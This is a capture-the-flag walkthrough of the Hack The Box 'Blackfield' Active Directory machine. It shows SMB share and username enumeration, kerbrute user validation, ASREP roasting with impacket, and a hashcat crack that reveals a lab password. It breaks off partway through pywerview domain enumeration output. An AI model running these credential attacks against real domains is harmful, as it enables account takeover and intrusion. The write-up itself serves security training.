# [blackfield](https://app.hackthebox.com/machines/Blackfield)

> A Windows Active Directory domain controller that has been recently compromised, forensically investigated, and partially secured. Anonymous access to an SMB share revealed a list of 300+ potential usernames. Username enumeration via Kerberos revealed that three of these usernames were valid. One of those users didn't require Kerberos pre-authentication and as a result was vulnerable to an ASREP Roasting attack. The cracked ASREP revealed the account's password. Domain enumeration with this credential revealed that the compromised user account had permission to change the password of the forensic auditor's user account. By changing the password, access to this account was achieved. The forensic auditor's account had access to an SMB share full of forensic artifacts from the recent investigation, including command output and process memory dumps. One of these memory dumps was of the LSASS process, which generally contains the credentials of users logged into the machine. Parsing the dump file revealed the password hash of a service account responsible for backups. This service account was capable of creating backups of arbitrary files on the domain controller's file system, including `ntds.dit` and the `SYSTEM` registry hive. Backing up these files and parsing them offline revealed the password hashes and Kerberos keys of all domain users, including the domain administrator. Its hash could be passed to the domain controller for administrative access.

---

## Open Port Enumeration

### TCP

```bash
$ sudo masscan -p1-65535 10.129.252.20 --rate=1000 -e tun0 --output-format grepable --output-filename enum/blackfield.masscan
Starting masscan 1.3.2 (http://bit.ly/14GZzcT) at 2021-11-08 16:59:20 GMT
Initiating SYN Stealth Scan
Scanning 1 hosts [65535 ports/host]
$ cat enum/blackfield.masscan  | grep open | cut -d' ' -f5 | cut -d'/' -f1 | sort -u | tr '\n' ','
135,139,3268,389,445,49672,53,593,88,
```

```bash
$ sudo nmap -sC -sV -O -p135,139,3268,389,445,49672,53,593,88 10.129.252.20 -oA enum/blackfield
Starting Nmap 7.92 ( https://nmap.org ) at 2021-11-08 19:27 EST
Nmap scan report for 10.129.252.20
Host is up (0.040s latency).

PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2021-11-09 07:27:50Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: BLACKFIELD.local0., Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: BLACKFIELD.local0., Site: Default-First-Site-Name)
49672/tcp open  msrpc         Microsoft Windows RPC
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
OS fingerprint not ideal because: Missing a closed TCP port so results incomplete
No OS matches for host
Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: 6h59m59s
| smb2-security-mode:
|   3.1.1:
|_    Message signing enabled and required
| smb2-time:
|   date: 2021-11-09T07:28:47
|_  start_date: N/A

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 100.06 seconds
```

The ports 53, 88, 445, and 389 indicate the target is a Windows Active Directory domain controller. According to the port 389 output, the domain name appears to be `blackfield.local`. 

### UDP

```bash
$ sudo nmap -sU 10.129.252.20
Starting Nmap 7.92 ( https://nmap.org ) at 2021-11-08 19:49 EST
Nmap scan report for 10.129.252.20
Host is up (0.041s latency).
Not shown: 998 open|filtered udp ports (no-response)
PORT    STATE SERVICE
53/udp  open  domain
389/udp open  ldap

Nmap done: 1 IP address (1 host up) scanned in 12.03 seconds
```

---

## LDAP Enumeration

```bash
$ ldapsearch -LLL -x -h 10.129.252.20 -D guest -b 'dc=blackfield,dc=local' '(&(objectclass=user)(name=*))' name sAMAccountName description
Operations error (1)
Additional information: 000004DC: LdapErr: DSID-0C090A69, comment: In order to perform this operation a successful bind must be completed on the connection., data 0, v4563
```

No luck with anonymous nor guest access.

---

## SMB Enumeration

SMB is accessible via the `guest` account. The shares `forensic` and `profiles$` are non-standard. However, it appears the `forensic` share is not readable anonymously.

```bash
$ smbmap -u "" -p "" -P 445 -H 10.129.252.20
[+] IP: 10.129.252.20:445       Name: 10.129.252.20
```

```bash
$ smbmap -u "guest" -p "" -P 445 -H 10.129.252.20
[+] IP: 10.129.252.20:445       Name: 10.129.252.20
        Disk                                                    Permissions     Comment
        ----                                                    -----------     -------
        ADMIN$                                                  NO ACCESS       Remote Admin
        C$                                                      NO ACCESS       Default share
        forensic                                                NO ACCESS       Forensic / Audit share.
        IPC$                                                    READ ONLY       Remote IPC
        NETLOGON                                                NO ACCESS       Logon server share
        profiles$                                               READ ONLY
        SYSVOL                                                  NO ACCESS       Logon server share
```

The `profiles$` share appears to be the directories of several potential users.

```bash
$ smbclient -U 'guest%' '//10.129.252.20/profiles$'
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Wed Jun  3 12:47:12 2020
  ..                                  D        0  Wed Jun  3 12:47:12 2020
  AAlleni                             D        0  Wed Jun  3 12:47:11 2020
  ABarteski                           D        0  Wed Jun  3 12:47:11 2020
  ABekesz                             D        0  Wed Jun  3 12:47:11 2020
  ABenzies                            D        0  Wed Jun  3 12:47:11 2020
  ABiemiller                          D        0  Wed Jun  3 12:47:11 2020
  AChampken                           D        0  Wed Jun  3 12:47:11 2020
  ACheretei                           D        0  Wed Jun  3 12:47:11 2020
  ACsonaki                            D        0  Wed Jun  3 12:47:11 2020
  AHigchens                           D        0  Wed Jun  3 12:47:11 2020
  AJaquemai                           D        0  Wed Jun  3 12:47:11 2020
  AKlado                              D        0  Wed Jun  3 12:47:11 2020
  AKoffenburger                       D        0  Wed Jun  3 12:47:11 2020
  AKollolli                           D        0  Wed Jun  3 12:47:11 2020
  AKruppe                             D        0  Wed Jun  3 12:47:11 2020
  AKubale                             D        0  Wed Jun  3 12:47:11 2020
  ALamerz                             D        0  Wed Jun  3 12:47:11 2020
  AMaceldon                           D        0  Wed Jun  3 12:47:11 2020
  AMasalunga                          D        0  Wed Jun  3 12:47:11 2020
  ANavay                              D        0  Wed Jun  3 12:47:11 2020
  ANesterova                          D        0  Wed Jun  3 12:47:11 2020
  ANeusse                             D        0  Wed Jun  3 12:47:11 2020
  AOkleshen                           D        0  Wed Jun  3 12:47:11 2020
  APustulka                           D        0  Wed Jun  3 12:47:11 2020
  ARotella                            D        0  Wed Jun  3 12:47:11 2020
  ASanwardeker                        D        0  Wed Jun  3 12:47:11 2020
  AShadaia                            D        0  Wed Jun  3 12:47:11 2020
  ASischo                             D        0  Wed Jun  3 12:47:11 2020
  ASpruce                             D        0  Wed Jun  3 12:47:11 2020
  ATakach                             D        0  Wed Jun  3 12:47:11 2020
  ATaueg                              D        0  Wed Jun  3 12:47:11 2020
  ATwardowski                         D        0  Wed Jun  3 12:47:11 2020
  audit2020                           D        0  Wed Jun  3 12:47:11 2020
  AWangenheim                         D        0  Wed Jun  3 12:47:11 2020
  AWorsey                             D        0  Wed Jun  3 12:47:11 2020
  AZigmunt                            D        0  Wed Jun  3 12:47:11 2020
  BBakajza                            D        0  Wed Jun  3 12:47:11 2020
  BBeloucif                           D        0  Wed Jun  3 12:47:11 2020
  BCarmitcheal                        D        0  Wed Jun  3 12:47:11 2020
  BConsultant                         D        0  Wed Jun  3 12:47:11 2020
  BErdossy                            D        0  Wed Jun  3 12:47:11 2020
  BGeminski                           D        0  Wed Jun  3 12:47:11 2020
  BLostal                             D        0  Wed Jun  3 12:47:11 2020
  BMannise                            D        0  Wed Jun  3 12:47:11 2020
  BNovrotsky                          D        0  Wed Jun  3 12:47:11 2020
  BRigiero                            D        0  Wed Jun  3 12:47:11 2020
  BSamkoses                           D        0  Wed Jun  3 12:47:11 2020
  BZandonella                         D        0  Wed Jun  3 12:47:11 2020
  CAcherman                           D        0  Wed Jun  3 12:47:12 2020
  CAkbari                             D        0  Wed Jun  3 12:47:12 2020
  CAldhowaihi                         D        0  Wed Jun  3 12:47:12 2020
  CArgyropolous                       D        0  Wed Jun  3 12:47:12 2020
  CDufrasne                           D        0  Wed Jun  3 12:47:12 2020
  CGronk                              D        0  Wed Jun  3 12:47:11 2020
  Chiucarello                         D        0  Wed Jun  3 12:47:11 2020
  Chiuccariello                       D        0  Wed Jun  3 12:47:12 2020
  CHoytal                             D        0  Wed Jun  3 12:47:12 2020
  CKijauskas                          D        0  Wed Jun  3 12:47:12 2020
  CKolbo                              D        0  Wed Jun  3 12:47:12 2020
  CMakutenas                          D        0  Wed Jun  3 12:47:12 2020
  CMorcillo                           D        0  Wed Jun  3 12:47:11 2020
  CSchandall                          D        0  Wed Jun  3 12:47:12 2020
  CSelters                            D        0  Wed Jun  3 12:47:12 2020
  CTolmie                             D        0  Wed Jun  3 12:47:12 2020
  DCecere                             D        0  Wed Jun  3 12:47:12 2020
  DChintalapalli                      D        0  Wed Jun  3 12:47:12 2020
  DCwilich                            D        0  Wed Jun  3 12:47:12 2020
  DGarbatiuc                          D        0  Wed Jun  3 12:47:12 2020
  DKemesies                           D        0  Wed Jun  3 12:47:12 2020
  DMatuka                             D        0  Wed Jun  3 12:47:12 2020
  DMedeme                             D        0  Wed Jun  3 12:47:12 2020
  DMeherek                            D        0  Wed Jun  3 12:47:12 2020
  DMetych                             D        0  Wed Jun  3 12:47:12 2020
  DPaskalev                           D        0  Wed Jun  3 12:47:12 2020
  DPriporov                           D        0  Wed Jun  3 12:47:12 2020
  DRusanovskaya                       D        0  Wed Jun  3 12:47:12 2020
  DVellela                            D        0  Wed Jun  3 12:47:12 2020
  DVogleson                           D        0  Wed Jun  3 12:47:12 2020
  DZwinak                             D        0  Wed Jun  3 12:47:12 2020
  EBoley                              D        0  Wed Jun  3 12:47:12 2020
  EEulau                              D        0  Wed Jun  3 12:47:12 2020
  EFeatherling                        D        0  Wed Jun  3 12:47:12 2020
  EFrixione                           D        0  Wed Jun  3 12:47:12 2020
  EJenorik                            D        0  Wed Jun  3 12:47:12 2020
  EKmilanovic                         D        0  Wed Jun  3 12:47:12 2020
  ElKatkowsky                         D        0  Wed Jun  3 12:47:12 2020
  EmaCaratenuto                       D        0  Wed Jun  3 12:47:12 2020
  EPalislamovic                       D        0  Wed Jun  3 12:47:12 2020
  EPryar                              D        0  Wed Jun  3 12:47:12 2020
  ESachhitello                        D        0  Wed Jun  3 12:47:12 2020
  ESariotti                           D        0  Wed Jun  3 12:47:12 2020
  ETurgano                            D        0  Wed Jun  3 12:47:12 2020
  EWojtila                            D        0  Wed Jun  3 12:47:12 2020
  FAlirezai                           D        0  Wed Jun  3 12:47:12 2020
  FBaldwind                           D        0  Wed Jun  3 12:47:12 2020
  FBroj                               D        0  Wed Jun  3 12:47:12 2020
  FDeblaquire                         D        0  Wed Jun  3 12:47:12 2020
  FDegeorgio                          D        0  Wed Jun  3 12:47:12 2020
  FianLaginja                         D        0  Wed Jun  3 12:47:12 2020
  FLasokowski                         D        0  Wed Jun  3 12:47:12 2020
  FPflum                              D        0  Wed Jun  3 12:47:12 2020
  FReffey                             D        0  Wed Jun  3 12:47:12 2020
  GaBelithe                           D        0  Wed Jun  3 12:47:12 2020
  Gareld                              D        0  Wed Jun  3 12:47:12 2020
  GBatowski                           D        0  Wed Jun  3 12:47:12 2020
  GForshalger                         D        0  Wed Jun  3 12:47:12 2020
  GGomane                             D        0  Wed Jun  3 12:47:12 2020
  GHisek                              D        0  Wed Jun  3 12:47:12 2020
  GMaroufkhani                        D        0  Wed Jun  3 12:47:12 2020
  GMerewether                         D        0  Wed Jun  3 12:47:12 2020
  GQuinniey                           D        0  Wed Jun  3 12:47:12 2020
  GRoswurm                            D        0  Wed Jun  3 12:47:12 2020
  GWiegard                            D        0  Wed Jun  3 12:47:12 2020
  HBlaziewske                         D        0  Wed Jun  3 12:47:12 2020
  HColantino                          D        0  Wed Jun  3 12:47:12 2020
  HConforto                           D        0  Wed Jun  3 12:47:12 2020
  HCunnally                           D        0  Wed Jun  3 12:47:12 2020
  HGougen                             D        0  Wed Jun  3 12:47:12 2020
  HKostova                            D        0  Wed Jun  3 12:47:12 2020
  IChristijr                          D        0  Wed Jun  3 12:47:12 2020
  IKoledo                             D        0  Wed Jun  3 12:47:12 2020
  IKotecky                            D        0  Wed Jun  3 12:47:12 2020
  ISantosi                            D        0  Wed Jun  3 12:47:12 2020
  JAngvall                            D        0  Wed Jun  3 12:47:12 2020
  JBehmoiras                          D        0  Wed Jun  3 12:47:12 2020
  JDanten                             D        0  Wed Jun  3 12:47:12 2020
  JDjouka                             D        0  Wed Jun  3 12:47:12 2020
  JKondziola                          D        0  Wed Jun  3 12:47:12 2020
  JLeytushsenior                      D        0  Wed Jun  3 12:47:12 2020
  JLuthner                            D        0  Wed Jun  3 12:47:12 2020
  JMoorehendrickson                   D        0  Wed Jun  3 12:47:12 2020
  JPistachio                          D        0  Wed Jun  3 12:47:12 2020
  JScima                              D        0  Wed Jun  3 12:47:12 2020
  JSebaali                            D        0  Wed Jun  3 12:47:12 2020
  JShoenherr                          D        0  Wed Jun  3 12:47:12 2020
  JShuselvt                           D        0  Wed Jun  3 12:47:12 2020
  KAmavisca                           D        0  Wed Jun  3 12:47:12 2020
  KAtolikian                          D        0  Wed Jun  3 12:47:12 2020
  KBrokinn                            D        0  Wed Jun  3 12:47:12 2020
  KCockeril                           D        0  Wed Jun  3 12:47:12 2020
  KColtart                            D        0  Wed Jun  3 12:47:12 2020
  KCyster                             D        0  Wed Jun  3 12:47:12 2020
  KDorney                             D        0  Wed Jun  3 12:47:12 2020
  KKoesno                             D        0  Wed Jun  3 12:47:12 2020
  KLangfur                            D        0  Wed Jun  3 12:47:12 2020
  KMahalik                            D        0  Wed Jun  3 12:47:12 2020
  KMasloch                            D        0  Wed Jun  3 12:47:12 2020
  KMibach                             D        0  Wed Jun  3 12:47:12 2020
  KParvankova                         D        0  Wed Jun  3 12:47:12 2020
  KPregnolato                         D        0  Wed Jun  3 12:47:12 2020
  KRasmor                             D        0  Wed Jun  3 12:47:12 2020
  KShievitz                           D        0  Wed Jun  3 12:47:12 2020
  KSojdelius                          D        0  Wed Jun  3 12:47:12 2020
  KTambourgi                          D        0  Wed Jun  3 12:47:12 2020
  KVlahopoulos                        D        0  Wed Jun  3 12:47:12 2020
  KZyballa                            D        0  Wed Jun  3 12:47:12 2020
  LBajewsky                           D        0  Wed Jun  3 12:47:12 2020
  LBaligand                           D        0  Wed Jun  3 12:47:12 2020
  LBarhamand                          D        0  Wed Jun  3 12:47:12 2020
  LBirer                              D        0  Wed Jun  3 12:47:12 2020
  LBobelis                            D        0  Wed Jun  3 12:47:12 2020
  LChippel                            D        0  Wed Jun  3 12:47:12 2020
  LChoffin                            D        0  Wed Jun  3 12:47:12 2020
  LCominelli                          D        0  Wed Jun  3 12:47:12 2020
  LDruge                              D        0  Wed Jun  3 12:47:12 2020
  LEzepek                             D        0  Wed Jun  3 12:47:12 2020
  LHyungkim                           D        0  Wed Jun  3 12:47:12 2020
  LKarabag                            D        0  Wed Jun  3 12:47:12 2020
  LKirousis                           D        0  Wed Jun  3 12:47:12 2020
  LKnade                              D        0  Wed Jun  3 12:47:12 2020
  LKrioua                             D        0  Wed Jun  3 12:47:12 2020
  LLefebvre                           D        0  Wed Jun  3 12:47:12 2020
  LLoeradeavilez                      D        0  Wed Jun  3 12:47:12 2020
  LMichoud                            D        0  Wed Jun  3 12:47:12 2020
  LTindall                            D        0  Wed Jun  3 12:47:12 2020
  LYturbe                             D        0  Wed Jun  3 12:47:12 2020
  MArcynski                           D        0  Wed Jun  3 12:47:12 2020
  MAthilakshmi                        D        0  Wed Jun  3 12:47:12 2020
  MAttravanam                         D        0  Wed Jun  3 12:47:12 2020
  MBrambini                           D        0  Wed Jun  3 12:47:12 2020
  MHatziantoniou                      D        0  Wed Jun  3 12:47:12 2020
  MHoerauf                            D        0  Wed Jun  3 12:47:12 2020
  MKermarrec                          D        0  Wed Jun  3 12:47:12 2020
  MKillberg                           D        0  Wed Jun  3 12:47:12 2020
  MLapesh                             D        0  Wed Jun  3 12:47:12 2020
  MMakhsous                           D        0  Wed Jun  3 12:47:12 2020
  MMerezio                            D        0  Wed Jun  3 12:47:12 2020
  MNaciri                             D        0  Wed Jun  3 12:47:12 2020
  MShanmugarajah                      D        0  Wed Jun  3 12:47:12 2020
  MSichkar                            D        0  Wed Jun  3 12:47:12 2020
  MTemko                              D        0  Wed Jun  3 12:47:12 2020
  MTipirneni                          D        0  Wed Jun  3 12:47:12 2020
  MTonuri                             D        0  Wed Jun  3 12:47:12 2020
  MVanarsdel                          D        0  Wed Jun  3 12:47:12 2020
  NBellibas                           D        0  Wed Jun  3 12:47:12 2020
  NDikoka                             D        0  Wed Jun  3 12:47:12 2020
  NGenevro                            D        0  Wed Jun  3 12:47:12 2020
  NGoddanti                           D        0  Wed Jun  3 12:47:12 2020
  NMrdirk                             D        0  Wed Jun  3 12:47:12 2020
  NPulido                             D        0  Wed Jun  3 12:47:12 2020
  NRonges                             D        0  Wed Jun  3 12:47:12 2020
  NSchepkie                           D        0  Wed Jun  3 12:47:12 2020
  NVanpraet                           D        0  Wed Jun  3 12:47:12 2020
  OBelghazi                           D        0  Wed Jun  3 12:47:12 2020
  OBushey                             D        0  Wed Jun  3 12:47:12 2020
  OHardybala                          D        0  Wed Jun  3 12:47:12 2020
  OLunas                              D        0  Wed Jun  3 12:47:12 2020
  ORbabka                             D        0  Wed Jun  3 12:47:12 2020
  PBourrat                            D        0  Wed Jun  3 12:47:12 2020
  PBozzelle                           D        0  Wed Jun  3 12:47:12 2020
  PBranti                             D        0  Wed Jun  3 12:47:12 2020
  PCapperella                         D        0  Wed Jun  3 12:47:12 2020
  PCurtz                              D        0  Wed Jun  3 12:47:12 2020
  PDoreste                            D        0  Wed Jun  3 12:47:12 2020
  PGegnas                             D        0  Wed Jun  3 12:47:12 2020
  PMasulla                            D        0  Wed Jun  3 12:47:12 2020
  PMendlinger                         D        0  Wed Jun  3 12:47:12 2020
  PParakat                            D        0  Wed Jun  3 12:47:12 2020
  PProvencer                          D        0  Wed Jun  3 12:47:12 2020
  PTesik                              D        0  Wed Jun  3 12:47:12 2020
  PVinkovich                          D        0  Wed Jun  3 12:47:12 2020
  PVirding                            D        0  Wed Jun  3 12:47:12 2020
  PWeinkaus                           D        0  Wed Jun  3 12:47:12 2020
  RBaliukonis                         D        0  Wed Jun  3 12:47:12 2020
  RBochare                            D        0  Wed Jun  3 12:47:12 2020
  RKrnjaic                            D        0  Wed Jun  3 12:47:12 2020
  RNemnich                            D        0  Wed Jun  3 12:47:12 2020
  RPoretsky                           D        0  Wed Jun  3 12:47:12 2020
  RStuehringer                        D        0  Wed Jun  3 12:47:12 2020
  RSzewczuga                          D        0  Wed Jun  3 12:47:12 2020
  RVallandas                          D        0  Wed Jun  3 12:47:12 2020
  RWeatherl                           D        0  Wed Jun  3 12:47:12 2020
  RWissor                             D        0  Wed Jun  3 12:47:12 2020
  SAbdulagatov                        D        0  Wed Jun  3 12:47:12 2020
  SAjowi                              D        0  Wed Jun  3 12:47:12 2020
  SAlguwaihes                         D        0  Wed Jun  3 12:47:12 2020
  SBonaparte                          D        0  Wed Jun  3 12:47:12 2020
  SBouzane                            D        0  Wed Jun  3 12:47:12 2020
  SChatin                             D        0  Wed Jun  3 12:47:12 2020
  SDellabitta                         D        0  Wed Jun  3 12:47:12 2020
  SDhodapkar                          D        0  Wed Jun  3 12:47:12 2020
  SEulert                             D        0  Wed Jun  3 12:47:12 2020
  SFadrigalan                         D        0  Wed Jun  3 12:47:12 2020
  SGolds                              D        0  Wed Jun  3 12:47:12 2020
  SGrifasi                            D        0  Wed Jun  3 12:47:12 2020
  SGtlinas                            D        0  Wed Jun  3 12:47:12 2020
  SHauht                              D        0  Wed Jun  3 12:47:12 2020
  SHederian                           D        0  Wed Jun  3 12:47:12 2020
  SHelregel                           D        0  Wed Jun  3 12:47:12 2020
  SKrulig                             D        0  Wed Jun  3 12:47:12 2020
  SLewrie                             D        0  Wed Jun  3 12:47:12 2020
  SMaskil                             D        0  Wed Jun  3 12:47:12 2020
  Smocker                             D        0  Wed Jun  3 12:47:12 2020
  SMoyta                              D        0  Wed Jun  3 12:47:12 2020
  SRaustiala                          D        0  Wed Jun  3 12:47:12 2020
  SReppond                            D        0  Wed Jun  3 12:47:12 2020
  SSicliano                           D        0  Wed Jun  3 12:47:12 2020
  SSilex                              D        0  Wed Jun  3 12:47:12 2020
  SSolsbak                            D        0  Wed Jun  3 12:47:12 2020
  STousignaut                         D        0  Wed Jun  3 12:47:12 2020
  support                             D        0  Wed Jun  3 12:47:12 2020
  svc_backup                          D        0  Wed Jun  3 12:47:12 2020
  SWhyte                              D        0  Wed Jun  3 12:47:12 2020
  SWynigear                           D        0  Wed Jun  3 12:47:12 2020
  TAwaysheh                           D        0  Wed Jun  3 12:47:12 2020
  TBadenbach                          D        0  Wed Jun  3 12:47:12 2020
  TCaffo                              D        0  Wed Jun  3 12:47:12 2020
  TCassalom                           D        0  Wed Jun  3 12:47:12 2020
  TEiselt                             D        0  Wed Jun  3 12:47:12 2020
  TFerencdo                           D        0  Wed Jun  3 12:47:12 2020
  TGaleazza                           D        0  Wed Jun  3 12:47:12 2020
  TKauten                             D        0  Wed Jun  3 12:47:12 2020
  TKnupke                             D        0  Wed Jun  3 12:47:12 2020
  TLintlop                            D        0  Wed Jun  3 12:47:12 2020
  TMusselli                           D        0  Wed Jun  3 12:47:12 2020
  TOust                               D        0  Wed Jun  3 12:47:12 2020
  TSlupka                             D        0  Wed Jun  3 12:47:12 2020
  TStausland                          D        0  Wed Jun  3 12:47:12 2020
  TZumpella                           D        0  Wed Jun  3 12:47:12 2020
  UCrofskey                           D        0  Wed Jun  3 12:47:12 2020
  UMarylebone                         D        0  Wed Jun  3 12:47:12 2020
  UPyrke                              D        0  Wed Jun  3 12:47:12 2020
  VBublavy                            D        0  Wed Jun  3 12:47:12 2020
  VButziger                           D        0  Wed Jun  3 12:47:12 2020
  VFuscca                             D        0  Wed Jun  3 12:47:12 2020
  VLitschauer                         D        0  Wed Jun  3 12:47:12 2020
  VMamchuk                            D        0  Wed Jun  3 12:47:12 2020
  VMarija                             D        0  Wed Jun  3 12:47:12 2020
  VOlaosun                            D        0  Wed Jun  3 12:47:12 2020
  VPapalouca                          D        0  Wed Jun  3 12:47:12 2020
  WSaldat                             D        0  Wed Jun  3 12:47:12 2020
  WVerzhbytska                        D        0  Wed Jun  3 12:47:12 2020
  WZelazny                            D        0  Wed Jun  3 12:47:12 2020
  XBemelen                            D        0  Wed Jun  3 12:47:12 2020
  XDadant                             D        0  Wed Jun  3 12:47:12 2020
  XDebes                              D        0  Wed Jun  3 12:47:12 2020
  XKonegni                            D        0  Wed Jun  3 12:47:12 2020
  XRykiel                             D        0  Wed Jun  3 12:47:12 2020
  YBleasdale                          D        0  Wed Jun  3 12:47:12 2020
  YHuftalin                           D        0  Wed Jun  3 12:47:12 2020
  YKivlen                             D        0  Wed Jun  3 12:47:12 2020
  YKozlicki                           D        0  Wed Jun  3 12:47:12 2020
  YNyirenda                           D        0  Wed Jun  3 12:47:12 2020
  YPredestin                          D        0  Wed Jun  3 12:47:12 2020
  YSeturino                           D        0  Wed Jun  3 12:47:12 2020
  YSkoropada                          D        0  Wed Jun  3 12:47:12 2020
  YVonebers                           D        0  Wed Jun  3 12:47:12 2020
  YZarpentine                         D        0  Wed Jun  3 12:47:12 2020
  ZAlatti                             D        0  Wed Jun  3 12:47:12 2020
  ZKrenselewski                       D        0  Wed Jun  3 12:47:12 2020
  ZMalaab                             D        0  Wed Jun  3 12:47:12 2020
  ZMiick                              D        0  Wed Jun  3 12:47:12 2020
  ZScozzari                           D        0  Wed Jun  3 12:47:12 2020
  ZTimofeeff                          D        0  Wed Jun  3 12:47:12 2020
  ZWausik                             D        0  Wed Jun  3 12:47:12 2020
```

---

## Username Enumeration

Export the usernames from the `profiles$` share to a text file and leverage Kerberos pre-authentication to determine whether any of them map to valid user accounts in the domain.

```bash
$ kerbrute userenum -d blackfield.local --dc 10.129.252.20 users.txt

    __             __               __
   / /_____  _____/ /_  _______  __/ /____
  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
 / ,< /  __/ /  / /_/ / /  / /_/ / /_/  __/
/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/

Version: v1.0.3 (9dad6e1) - 11/08/21 - Ronnie Flathers @ropnop

2021/11/08 21:51:38 >  Using KDC(s):
2021/11/08 21:51:38 >   10.129.252.20:88


2021/11/08 21:51:58 >  [+] VALID USERNAME:       audit2020@blackfield.local
2021/11/08 21:53:50 >  [+] VALID USERNAME:       svc_backup@blackfield.local
2021/11/08 21:53:50 >  [+] VALID USERNAME:       support@blackfield.local
2021/11/08 21:54:21 >  Done! Tested 313 usernames (3 valid) in 162.643 seconds
```

Three of the 313 names are actual domain user accounts: `audit2020`, `svc_backup`, and `support`.

---

## ASREP Roasting

Determine if any of the valid users are ASREP Roastable.

```bash
$ impacket-GetNPUsers -dc-ip 10.129.252.20 blackfield.local/ -usersfile users.txt -format hashcat
Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation

[-] User audit2020 doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User svc_backup doesn't have UF_DONT_REQUIRE_PREAUTH set
$krb5asrep$23$support@BLACKFIELD.LOCAL:b4dd52b397f19f2f6a9dd9bbd7978e40$ca85a85626bc177fb765b61a081df67f8283d10e93d61d7eca61851b7147a1846d6f2b9f368c433254bdf81c5b3e1f4baed506e7ff47fc9dcb55a1f608686688f499cd201d2a5119c6f87dd37dd2b934068e4d50147ec96870e4ecd418e3957031cbd866c2c87475535bdf63402fc67942d0d7565e406d899dfb45289ea0ab3ff6e43889e267bbee5bd70a53bc8ad28b198124b45a7369eb3caa50f465b1cc05d0621c43d697e7ec52962978505f1d3123154ea8ea8186ebcc96f5c4defea4763a3247b3d966baae48ddd0db9fb514d13ee8f4e4e4f30189bfd443f81620fed8056a0b185589594ce4f427673caa354ba68523e6
```

The `support` user is ASREP Roastable. Attempt to crack the ASREP and determine its password.

```bash
hashcat -m 18200 -a 0 $krb5asrep$23$support@BLACKFIELD.LOCAL:b4dd52b397f19f2f6a9dd9bbd7978e40$ca85a85626bc177fb765b61a081df67f8283d10e93d61d7eca61851b7147a1846d6f2b9f368c433254bdf81c5b3e1f4baed506e7ff47fc9dcb55a1f608686688f499cd201d2a5119c6f87dd37dd2b934068e4d50147ec96870e4ecd418e3957031cbd866c2c87475535bdf63402fc67942d0d7565e406d899dfb45289ea0ab3ff6e43889e267bbee5bd70a53bc8ad28b198124b45a7369eb3caa50f465b1cc05d0621c43d697e7ec52962978505f1d3123154ea8ea8186ebcc96f5c4defea4763a3247b3d966baae48ddd0db9fb514d13ee8f4e4e4f30189bfd443f81620fed8056a0b185589594ce4f427673caa354ba68523e6 rockyou.txt
$krb5asrep$23$support@BLACKFIELD.LOCAL:b4dd52b397f19f2f6a9dd9bbd7978e40$ca85a85626bc177fb765b61a081df67f8283d10e93d61d7eca61851b7147a1846d6f2b9f368c433254bdf81c5b3e1f4baed506e7ff47fc9dcb55a1f608686688f499cd201d2a5119c6f87dd37dd2b934068e4d50147ec96870e4ecd418e3957031cbd866c2c87475535bdf63402fc67942d0d7565e406d899dfb45289ea0ab3ff6e43889e267bbee5bd70a53bc8ad28b198124b45a7369eb3caa50f465b1cc05d0621c43d697e7ec52962978505f1d3123154ea8ea8186ebcc96f5c4defea4763a3247b3d966baae48ddd0db9fb514d13ee8f4e4e4f30189bfd443f81620fed8056a0b185589594ce4f427673caa354ba68523e6:#00^BlackKnight
```

The crack was successful, yielding the credential `support`:`#00^BlackKnight`.

---

## Domain Enumeration

---

### Domain Controllers

The only domain controller is `DC01.blackfield.local`.

```bash
$ pywerview get-netdomaincontroller -w blackfield.local -u support -p '#00^BlackKnight' --dc-ip 10.129.250.124 -d blackfield.local
accountexpires:                9223372036854775807
badpasswordtime:               2020-02-23 12:14:34.951936
badpwdcount:                   0
cn:                            DC01
codepage:                      0
countrycode:                   0
distinguishedname:             CN=DC01,OU=Domain Controllers,DC=BLACKFIELD,DC=local
dnshostname:                   DC01.BLACKFIELD.local
dscorepropagationdata:         2020-02-23 11:14:01,
                               1601-01-01 00:00:01
instancetype:                  4
iscriticalsystemobject:        TRUE
isgroup:                       False
lastlogoff:                    1600-12-31 19:03:58
lastlogon:                     2021-11-09 16:22:35.627851
lastlogontimestamp:            132805249345101039
localpolicyflags:              0
logoncount:                    120
msdfsr-computerreferencebl:    CN=DC01,CN=Topology,CN=Domain System Volume,CN=DFSR-GlobalSettings,CN=System,DC=BLACKFIELD,DC=local
msds-generationid:             61,
                               32,
                               101,
                               49,
                               192,
                               63,
                               107,
                               64
msds-supportedencryptiontypes: 28
name:                          DC01
objectcategory:                CN=Computer,CN=Schema,CN=Configuration,DC=BLACKFIELD,DC=local
objectclass:                   top,
                               person,
                               organizationalPerson,
                               user,
                               computer
objectguid:                    b5ada5c8-edeb-4f19-b'8092'-e14e51662f9e
objectsid:                     S-1-5-21-4194615774-2175524697-3563712290-1000
operatingsystem:               Windows Server 2019 Standard
operatingsystemversion:        10.0 (17763)
primarygroupid:                516
pwdlastset:                    2021-11-04 14:42:06.322601
ridsetreferences:              CN=RID Set,CN=DC01,OU=Domain Controllers,DC=BLACKFIELD,DC=local
samaccountname:                DC01$
samaccounttype:                805306369
serverreferencebl:             CN=DC01,CN=Servers,CN=Default-First-Site-Name,CN=Sites,CN=Configuration,DC=BLACKFIELD,DC=local
serviceprincipalname:          Dfsr-12F9A27C-BF97-4787-9364-D31B6C55EB04/DC01.BLACKFIELD.local,
                               ldap/DC01.BLACKFIELD.local/ForestDnsZones.BLACKFIELD.local,
                               ldap/DC01.BLACKFIELD.local/DomainDnsZones.BLACKFIELD.local,
                               TERMSRV/DC01,
                               TERMSRV/DC01.BLACKFIELD.local,
                               DNS/DC01.BLACKFIELD.local,
